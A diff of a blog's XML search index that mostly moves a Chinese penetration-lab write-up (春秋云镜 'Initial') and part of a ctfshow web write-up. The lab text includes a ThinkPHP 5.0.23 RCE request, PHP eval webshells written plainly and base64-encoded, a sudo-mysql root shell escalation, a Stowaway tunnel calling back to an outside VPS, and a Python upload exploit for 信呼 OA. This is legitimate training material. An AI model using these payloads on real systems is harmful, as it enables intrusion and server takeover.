@@ -2049,158 +2049,8 @@
       </tags>
   </entry>
   <entry>
-    <title>春秋云镜 Initial WP</title>
-    <url>/2025/03/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial-WP/</url>
-    <content><![CDATA[<h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><p><strong><img src="../image/achieve/202411/春秋云镜/image-20250309221311104.png" alt="image-20250309221311104" style="zoom: 67%;" /></strong></p>
-<h1 id="flag-1-：-外网打点"><a href="#flag-1-：-外网打点" class="headerlink" title="flag-1 ： 外网打点"></a>flag-1 ： 外网打点</h1><p>先用fscan扫一下端口和漏洞</p>
-<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250309220622197.png" alt="image-20250309220622197"></p>
-<p>扫出来一个80端口开放的网站，同时扫出一个ThinkPHP5 5.0.23 远程代码执行漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ThinkPHP是国内使用极为广泛的PHP开发框架，在5.0版本(&lt;5.0.24)中，框架在获取请求方法时存在错误处理，导致攻击者可以调用Request类的任意方法，通过特定的利用链造成RCE漏洞。</span><br></pre></td></tr></table></figure>
-
-<p>访问是一个登录页面</p>
-<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250309221004774.png" alt="image-20250309221004774"></p>
-<h2 id="thinkphp-getshell方法"><a href="#thinkphp-getshell方法" class="headerlink" title="thinkphp getshell方法"></a>thinkphp getshell方法</h2><h3 id="方法一-thinkphp一把梭"><a href="#方法一-thinkphp一把梭" class="headerlink" title="方法一:thinkphp一把梭"></a>方法一:thinkphp一把梭</h3><p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309221723327.png" alt="image-20250309221723327"></p>
-<p>直接连马就行</p>
-<h3 id="方法二-手动注入"><a href="#方法二-手动注入" class="headerlink" title="方法二:手动注入"></a>方法二:手动注入</h3><p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309221845306.png" alt="image-20250309221845306"></p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309222104463.png" alt="image-20250309222104463"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 39.99.137.168</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 76</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>
-
-<p>whoami有回显，用file_put_contents函数写一句话木马</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309222500648.png" alt="image-20250309222500648"></p>
-<p>然后用system执行ls看一下有没有写进去</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/b5618ea21af9e4fea09a42daeb0cf966.png" alt="b5618ea21af9e4fea09a42daeb0cf966"></p>
-<p>哈哈哈哈哈和群友一起打的，他们传了好多木马</p>
-<p>直接连马</p>
-<h2 id="寻找flag-提权"><a href="#寻找flag-提权" class="headerlink" title="寻找flag+提权"></a>寻找flag+提权</h2><p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309222943516.png" alt="image-20250309222943516"></p>
-<p>在根目录看到root，但是root文件没权限访问</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309223229389.png" alt="image-20250309223229389"></p>
-<p>用蚁剑的插件去提权</p>
-<p>输入<code>sudo -l</code>回显</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309223531043.png" alt="image-20250309223531043"></p>
-<p>这段命令输出是在 Linux 系统上使用 <code>sudo -l</code> 查看用户 <code>www-data</code> 在当前主机上可以通过 <code>sudo</code> 命令以特权用户身份运行的命令。</p>
-<p>这里可以看出来<code>www-data</code> 用户可以直接以 root 权限执行 MySQL 命令。</p>
-<p>然后我们通过 MySQL 执行系统命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(www-data:/var/www/html) $ sudo mysql -e &#x27;\! /bin/sh&#x27;</span><br><span class="line">(www-data:/var/www/html) $ sudo mysql -e &#x27;\! ls /root&#x27;</span><br><span class="line">flag</span><br><span class="line">(www-data:/var/www/html) $ sudo mysql -e &#x27;\! ls /root/flag&#x27;</span><br><span class="line">flag01.txt</span><br><span class="line">(www-data:/var/www/html) $ sudo mysql -e &#x27;\! cat /root/flag/flag01.txt&#x27;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>\!</code> 是 MySQL 命令行中的一个特殊命令，用于执行系统命令。在这种情况下，它启动了一个新的 shell（<code>/bin/sh</code>）。</li>
-</ul>
-<p>flag01: flag{60b53231-</p>
-<h1 id="flag-2，3：内网渗透"><a href="#flag-2，3：内网渗透" class="headerlink" title="flag-2，3：内网渗透"></a>flag-2，3：内网渗透</h1><h2 id="内网ip探测"><a href="#内网ip探测" class="headerlink" title="内网ip探测"></a>内网ip探测</h2><p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309224102429.png" alt="image-20250309224102429"></p>
-<p>上传一个fscan在tmp目录下(群友已经传了，直接用了)</p>
-<p>给777权限然后扫内网ip</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(www-data:/var/www/html/tmp) $ ./fscan -h 172.22.1.0/24</span><br></pre></td></tr></table></figure>
-
-<p>结果在当前目录下的result.txt</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.2:88 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[+] MS17-010 172.22.1.21	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login</span><br><span class="line">[*] OsInfo 172.22.1.2	(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统</span><br><span class="line">[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure>
-
-<p>172.22.1.21：对应的主机名为 <code>XIAORANG-OA01</code>，存在MS17-010 漏洞</p>
-<p>172.22.1.2：DC域控</p>
-<p>172.22.1.18：信呼OA办公系统</p>
-<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h3 id="使用Stowaway搭建隧道"><a href="#使用Stowaway搭建隧道" class="headerlink" title="使用Stowaway搭建隧道"></a>使用Stowaway搭建隧道</h3><p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309230505042.png" alt="image-20250309230505042"></p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309231411403.png" alt="image-20250309231411403"></p>
-<p>先上传一个linux_x64_agent到靶机然后777给权限</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309230615074.png" alt="image-20250309230615074"></p>
-<p>然后上传linux_x64_admin到自己的云服务器并给权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./linux_x64_admin -l 12345 -s 654321</span><br></pre></td></tr></table></figure>
-
-<p>设置参数，设置监听端口为12345</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309231628694.png" alt="image-20250309231628694"></p>
-<p>然后靶机执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./linux_x64_agent -c 123.56.166.154:12345 -s 654321 --reconnect 8</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309231817679.png" alt="image-20250309231817679"></p>
-<p>成功搭建隧道</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">socks 5555 //端口自定义</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309232238383.png" alt="image-20250309232238383"></p>
-<p>proxy插件配置代理ip为vps的ip然后端口为5555后访问</p>
-<h3 id="信呼协同办公系统v2-2-8文件上传漏洞"><a href="#信呼协同办公系统v2-2-8文件上传漏洞" class="headerlink" title="信呼协同办公系统v2.2.8文件上传漏洞"></a>信呼协同办公系统v2.2.8文件上传漏洞</h3><p>发现代理配置一直不是很稳定，直接看的师傅的wp去做了</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309232759051.png" alt="image-20250309232759051"></p>
-<p>弱口令admin&#x2F;admin123登录</p>
-<p>文件上传漏洞，直接exp一把梭</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;socks5://47.109.176.117:5555&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;&lt;?php eval($_POST[&#x27;Infernity&#x27;]);&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">session.post(url1, data=data1, proxies=proxy)</span><br><span class="line">res = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;, proxies=proxy)</span><br><span class="line">os.remove(<span class="string">&#x27;1.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(res.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = res.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(filepath)</span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">session.get(url3, proxies=proxy)</span><br><span class="line">res = session.post(url_pre + filepath,data=&#123;<span class="string">&quot;Infernity&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;, proxies=proxy)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
-
-<p>得到上传木马的路径后访问文件然后用蚁剑连接</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309233225962.png" alt="image-20250309233225962"></p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image.png" alt="img"></p>
-<p>是Windows的服务器，直接终端找flag</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-1741534511133-29.png" alt="img"></p>
-<p>查看看到flag02的内容</p>
-<p>最后一个ms17-010永恒之蓝的漏洞，不过好像端口关了，msf打不进去， 就先做到这里吧</p>
-]]></content>
-      <categories>
-        <category>春秋云镜</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>春秋云镜初试</title>
-    <url>/2025/03/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%9D%E8%AF%95/</url>
-    <content><![CDATA[<p>第一个flag</p>
-<p>用fscan扫一下发现是thinkphp的rce</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124203704494.png" alt="image-20250124203704494"></p>
-<p>访问一下网址</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124204059960.png" alt="image-20250124204059960"></p>
-<p>扫目录</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124204131189.png" alt="image-20250124204131189"></p>
-<p>访问出来还是index.php</p>
-<p>直接看漏洞浮现就可以</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124204550931.png" alt="image-20250124204550931"></p>
-<p>抓包上传</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124205041006.png" alt="image-20250124205041006"></p>
-<p>id可以看到当前的用户信息，然后我们用pwd看一下当前目录</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124205417353.png" alt="image-20250124205417353"></p>
-<p>放蚁剑打好一点，往里面写个一句话</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; &gt; /var/www/html</span><br></pre></td></tr></table></figure>
-
-<p>然后ls看一下木马是否成功写入</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124205453216.png" alt="image-20250124205453216"></p>
-<p>看到写入了，用蚁剑连一下</p>
-<p>但是没连上，是被吃了吗？？？</p>
-<p>穿个phpifo的php文件试一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php phpinfo();?&gt;&quot; &gt; /var/www/html/test2.php</span><br></pre></td></tr></table></figure>
-
-<p>然后访问test2.php是可以出来的</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124210100299.png" alt="image-20250124210100299"></p>
-<p>应该是有什么被过滤了，我们用base64编码传进去试一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot; | base64 -d &gt; /var/www/html/1.php</span><br></pre></td></tr></table></figure>
-
-<p>然后ls可以看到传进去了</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124210434966.png" alt="image-20250124210434966"></p>
-<p>用蚁剑终于可以连上了</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124210510943.png" alt="image-20250124210510943"></p>
-<p>找不到flag，可能在root里，试试提权。我们可以用插件，然后添加用户</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124211559048.png" alt="image-20250124211559048"></p>
-<p>然后终端输入sudo -l</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124211830447.png" alt="image-20250124211830447"></p>
-<p>说明我们可以通过sudo高权限运行mysql</p>
-<p>mysql 8.0以上有<code>system(\!)</code>可以执行系统命令。</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124212106487.png" alt="image-20250124212106487"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! /bin/sh&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>其中-e表示执行系统命令，感叹号!表示开始执行系统命令，由于在bash语句中的感叹号!表示访问历史记录，因此要对感叹号!使用反斜杠\进行转义。</p>
-<p>然后我们顺着cat就能拿到第一个flag了</p>
-<p>第二个flag</p>
-<p>通过ip -a去查看网段</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124212600129.png" alt="image-20250124212600129"></p>
-<p>可以看到是172.22.1.15&#x2F;16，拿fscan扫一下(注意是拿靶机的服务器)</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250124213454997.png" alt="image-20250124213454997"></p>
-<p>我们fscan的结果会存到一个result.txt中</p>
-<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/3110a474dc742d95d719da0c3f39bfdf.png" alt="3110a474dc742d95d719da0c3f39bfdf"></p>
-<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
-      <categories>
-        <category>春秋云镜</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfshow之web专题</title>
-    <url>/2025/03/08/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/</url>
+    <url>/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/</url>
     <content><![CDATA[<h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>因为这里的题有些也是比较简单的，所以这里的知识点和做法不会讲述特别多，不会的可以直接看其他文章的题目有写的很详细的</p>
 <h1 id="0x02web题目"><a href="#0x02web题目" class="headerlink" title="0x02web题目"></a>0x02web题目</h1><h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="#源码泄露"></a>#源码泄露</h3><p>查看源代码然后拿去进行base64编码就可以拿到flag了</p>
 <h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><h3 id="mysql联合注入"><a href="#mysql联合注入" class="headerlink" title="#mysql联合注入"></a>#mysql联合注入</h3><p>最简单的sql注入</p>
@@ -2552,13 +2402,165 @@
 
 <p>这样的话上面的长字符就可以理解了，传入的值进行了md5加密处理</p>
 <p>不过大部分字符都被过滤了，正常的union注入应该不太好注，尝试布尔盲注</p>
-<p>得知密码列为pwd，那么就可以通过已知注册用户密码和flag来进行比较，通过位置来确定每一个字符，如果我们注册的密码字符大于</p>
+<p>得知密码列为pwd，那么就可以通过已知注册用户密码和flag来进行比较，通过位置来确定每一个字符，如果我们注册的密码字符大于flag用户的密码那么就会返回这个字符，通过判断去进行注入</p>
+<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/02aa69bd8a6c3fd38aff77dbe053af5.png" alt="02aa69bd8a6c3fd38aff77dbe053af5"></p>
+<p>也是贴的别的师傅的脚本</p>
 ]]></content>
       <categories>
         <category>ctfshow</category>
       </categories>
       <tags>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>春秋云镜 Initial WP</title>
+    <url>/2025/03/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial-WP/</url>
+    <content><![CDATA[<h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><p><strong><img src="../image/achieve/202411/春秋云镜/image-20250309221311104.png" alt="image-20250309221311104" style="zoom: 67%;" /></strong></p>
+<h1 id="flag-1-：-外网打点"><a href="#flag-1-：-外网打点" class="headerlink" title="flag-1 ： 外网打点"></a>flag-1 ： 外网打点</h1><p>先用fscan扫一下端口和漏洞</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250309220622197.png" alt="image-20250309220622197"></p>
+<p>扫出来一个80端口开放的网站，同时扫出一个ThinkPHP5 5.0.23 远程代码执行漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ThinkPHP是国内使用极为广泛的PHP开发框架，在5.0版本(&lt;5.0.24)中，框架在获取请求方法时存在错误处理，导致攻击者可以调用Request类的任意方法，通过特定的利用链造成RCE漏洞。</span><br></pre></td></tr></table></figure>
+
+<p>访问是一个登录页面</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250309221004774.png" alt="image-20250309221004774"></p>
+<h2 id="thinkphp-getshell方法"><a href="#thinkphp-getshell方法" class="headerlink" title="thinkphp getshell方法"></a>thinkphp getshell方法</h2><h3 id="方法一-thinkphp一把梭"><a href="#方法一-thinkphp一把梭" class="headerlink" title="方法一:thinkphp一把梭"></a>方法一:thinkphp一把梭</h3><p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309221723327.png" alt="image-20250309221723327"></p>
+<p>直接连马就行</p>
+<h3 id="方法二-手动注入"><a href="#方法二-手动注入" class="headerlink" title="方法二:手动注入"></a>方法二:手动注入</h3><p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309221845306.png" alt="image-20250309221845306"></p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309222104463.png" alt="image-20250309222104463"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 39.99.137.168</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 76</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>
+
+<p>whoami有回显，用file_put_contents函数写一句话木马</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309222500648.png" alt="image-20250309222500648"></p>
+<p>然后用system执行ls看一下有没有写进去</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/b5618ea21af9e4fea09a42daeb0cf966.png" alt="b5618ea21af9e4fea09a42daeb0cf966"></p>
+<p>哈哈哈哈哈和群友一起打的，他们传了好多木马</p>
+<p>直接连马</p>
+<h2 id="寻找flag-提权"><a href="#寻找flag-提权" class="headerlink" title="寻找flag+提权"></a>寻找flag+提权</h2><p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309222943516.png" alt="image-20250309222943516"></p>
+<p>在根目录看到root，但是root文件没权限访问</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309223229389.png" alt="image-20250309223229389"></p>
+<p>用蚁剑的插件去提权</p>
+<p>输入<code>sudo -l</code>回显</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309223531043.png" alt="image-20250309223531043"></p>
+<p>这段命令输出是在 Linux 系统上使用 <code>sudo -l</code> 查看用户 <code>www-data</code> 在当前主机上可以通过 <code>sudo</code> 命令以特权用户身份运行的命令。</p>
+<p>这里可以看出来<code>www-data</code> 用户可以直接以 root 权限执行 MySQL 命令。</p>
+<p>然后我们通过 MySQL 执行系统命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(www-data:/var/www/html) $ sudo mysql -e &#x27;\! /bin/sh&#x27;</span><br><span class="line">(www-data:/var/www/html) $ sudo mysql -e &#x27;\! ls /root&#x27;</span><br><span class="line">flag</span><br><span class="line">(www-data:/var/www/html) $ sudo mysql -e &#x27;\! ls /root/flag&#x27;</span><br><span class="line">flag01.txt</span><br><span class="line">(www-data:/var/www/html) $ sudo mysql -e &#x27;\! cat /root/flag/flag01.txt&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>\!</code> 是 MySQL 命令行中的一个特殊命令，用于执行系统命令。在这种情况下，它启动了一个新的 shell（<code>/bin/sh</code>）。</li>
+</ul>
+<p>flag01: flag{60b53231-</p>
+<h1 id="flag-2，3：内网渗透"><a href="#flag-2，3：内网渗透" class="headerlink" title="flag-2，3：内网渗透"></a>flag-2，3：内网渗透</h1><h2 id="内网ip探测"><a href="#内网ip探测" class="headerlink" title="内网ip探测"></a>内网ip探测</h2><p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20250309224102429.png" alt="image-20250309224102429"></p>
+<p>上传一个fscan在tmp目录下(群友已经传了，直接用了)</p>
+<p>给777权限然后扫内网ip</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(www-data:/var/www/html/tmp) $ ./fscan -h 172.22.1.0/24</span><br></pre></td></tr></table></figure>
+
+<p>结果在当前目录下的result.txt</p>
